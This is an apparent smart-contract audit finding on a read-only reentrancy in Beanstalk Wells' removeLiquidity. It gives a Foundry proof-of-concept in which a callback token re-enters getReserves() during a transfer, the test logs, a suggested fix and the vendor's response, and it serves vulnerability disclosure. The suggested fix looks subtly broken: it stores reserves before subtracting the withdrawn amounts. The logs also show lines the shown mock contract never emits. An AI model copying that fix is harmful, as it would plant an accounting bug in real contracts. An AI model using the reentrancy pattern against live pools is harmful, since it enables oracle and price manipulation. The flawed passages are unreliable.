---
tags:
  - lang/solidity
  - sector/dex
  - sector/oracle
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - vuln/access-control/missing-modifier
  - vuln/reentrancy/read-only
  - vuln/reentrancy/single-function
  - impact/data-corruption/price-manipulation
  - trigger/price-manipulation
  - fix/use-reentrancy-guard
  - novelty/known-pattern
  - misassumption/admin-is-honest
  - misassumption/external-call-is-safe
  - fix/add-access-control
  - trigger/reentrancy-callback
protocol: "[[Beanstalk]]"
auditors:
  - "[[Hans]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-16-Beanstalk wells.md"
genome:
  - "[[missing-modifier]]"
  - "[[read-only]]"
  - "[[single-function]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[trigger/price-manipulation]]"
  - "[[use-reentrancy-guard]]"
  - "[[known-pattern]]"
  - "[[access-roles]]"
  - "[[fot-slippage]]"
  - "[[oracle-manipulation-resistance]]"
  - "[[reentrancy-guard]]"
---
# Read-only reentrancy

- id: 18434
- impact: HIGH
- protocol: [[Beanstalk]] Wells
- reporter: Hans (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-16-Beanstalk wells.md

## Summary


This bug report describes a vulnerability in the current implementation of the Wells smart contract. It is vulnerable to read-only reentrancy, which is a type of attack that can be exploited by malicious attackers or unsuspecting ecosystem participants. This vulnerability is caused by the fact that the implementation does not follow the Checks-Effects-Interactions (CEI) pattern, which sets the new reserve values before sending out tokens. This can lead to critical vulnerabilities, especially when the Wells are extended with price functions defined by pumps. 

To demonstrate the vulnerability, a test case was written to show the existing read-only reentrancy. It showed that when the `getReserves()` function was called before reserves had been correctly updated, the pump functions would likely be incorrect. 

The severity of the vulnerability is HIGH. To mitigate the issue, the CEI pattern should be implemented in relevant functions by updating reserves before making external calls. A check was added to the `getReserves()` function that reverts if the Reentrancy guard has been entered, preventing anyone from calling `getReserves()` while executing a function in the Well.

## Details

**Description:** The current implementation is vulnerable to read-only reentrancy, especially in [Wells::removeLiquidity](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/Well.sol#L440).
The implementation does not strictly follow the [Checks-Effects-Interactions (CEI) pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) as it is setting the new reserve values after sending out the tokens. This is not an immediate risk to the protocol itself due to the `nonReentrant` modifier, but this is still vulnerable to [read-only reentrancy](https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/).

Malicious attackers and unsuspecting ecosystem participants can deploy Wells with ERC-777 tokens (which have a callback that can take control) and exploit this vulnerability. This will lead to critical vulnerabilities given that the Wells are to be extended with price functions as defined by pumps - third-party protocols that integrate these on-chain oracles will be at risk.

Pumps are updated before token transfers; however, reserves are only set after. Therefore, pump functions will likely be incorrect on a re-entrant read-only call if `IWell(well).getReserves()` is called but reserves have not been correctly updated. The implementation of `GeoEmaAndCumSmaPump` appears not to be vulnerable, but given that each pump can choose its approach for recording a well's reserves over time, this remains a possible attack vector.

**Impact:** Although this is not an immediate risk to the protocol itself, read-only re-entrancy can lead to critical issues, so we evaluate the severity as HIGH.

**Proof of Concept:** We wrote a test case to show the existing read-only reentrancy.

```solidity
// MockCallbackRecipient.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {console} from "forge-std/Test.sol";

contract MockCallbackRecipient {
    fallback() external payable {
        console.log("here");
        (bool success, bytes memory result) = msg.sender.call(abi.encodeWithSignature("getReserves()"));
        if (success) {
            uint256[] memory reserves = abi.decode(result, (uint256[]));
            console.log("read-only-reentrancy beforeTokenTransfer reserves[0]: %s", reserves[0]);
            console.log("read-only-reentrancy beforeTokenTransfer reserves[1]: %s", reserves[1]);
        }
    }
}

// NOTE: Put in Exploit.t.sol
function test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() public {
    IERC20 callbackToken = IERC20(new MockCallbackToken("CallbackToken", "CBTKN", 18));
    MockToken(address(callbackToken)).mint(user, 1000e18);
    IERC20[] memory _tokens = new IERC20[](2);
    _tokens[0] = callbackToken;
    _tokens[1] = tokens[1];

    vm.stopPrank();
    Well well2 = Well(auger.bore("Well2", "WELL2", _tokens, wellFunction, pumps));
    approveMaxTokens(user, address(well2));

    uint[] memory amounts = new uint[](2);
    amounts[0] = 100 * 1e18;
    amounts[1] = 100 * 1e18;

    changePrank(user);
    callbackToken.approve(address(well2), type(uint).max);
    uint256 lpAmountOut = well2.addLiquidity(amounts, 0, user);

    well2.removeLiquidity(lpAmountOut, amounts, user);
}
```

The output is shown below.

```
forge test -vv --match-test test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken

[PASS] test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() (gas: 5290876)
Logs:
  read-only-reentrancy beforeTokenTransfer reserves[0]: 0
  read-only-reentrancy beforeTokenTransfer reserves[1]: 0
  read-only-reentrancy afterTokenTransfer reserves[0]: 0
  read-only-reentrancy afterTokenTransfer reserves[1]: 0
  read-only-reentrancy beforeTokenTransfer reserves[0]: 100000000000000000000
  read-only-reentrancy beforeTokenTransfer reserves[1]: 100000000000000000000
  read-only-reentrancy afterTokenTransfer reserves[0]: 100000000000000000000
  read-only-reentrancy afterTokenTransfer reserves[1]: 100000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 3.66ms
```

**Recommended Mitigation:** Implement the CEI pattern in relevant functions by updating reserves before making external calls. For example, the function `Well::removeLiquidity` can be modified shown below.

```solidity
function removeLiquidity(
    uint lpAmountIn,
    uint[] calldata minTokenAmountsOut,
    address recipient
) external nonReentrant returns (uint[] memory tokenAmountsOut) {
    IERC20[] memory _tokens = tokens();
    uint[] memory reserves = _updatePumps(_tokens.length);
    uint lpTokenSupply = totalSupply();

    tokenAmountsOut = new uint[](_tokens.length);
    _burn(msg.sender, lpAmountIn);

    _setReserves(reserves); // @audit CEI pattern

    for (uint i; i < _tokens.length; ++i) {
        tokenAmountsOut[i] = (lpAmountIn * reserves[i]) / lpTokenSupply;
        require(
            tokenAmountsOut[i] >= minTokenAmountsOut[i],
            "Well: slippage"
        );
        _tokens[i].safeTransfer(recipient, tokenAmountsOut[i]);
        reserves[i] = reserves[i] - tokenAmountsOut[i];
    }

    emit RemoveLiquidity(lpAmountIn, tokenAmountsOut);
}
```

**Beanstalk:** Added a check to the `getReserves()` function that reverts if the Reentrancy guard has been entered. This prevents anyone from calling `getReserves()` while executing a function in the Well. Fixed in commit [fcbf04a](https://github.com/BeanstalkFarms/Basin/pull/85/commits/fcbf04a99b00807891fb2a9791ba18ed425479ab).

**Cyfrin:** Acknowledged.

\clearpage
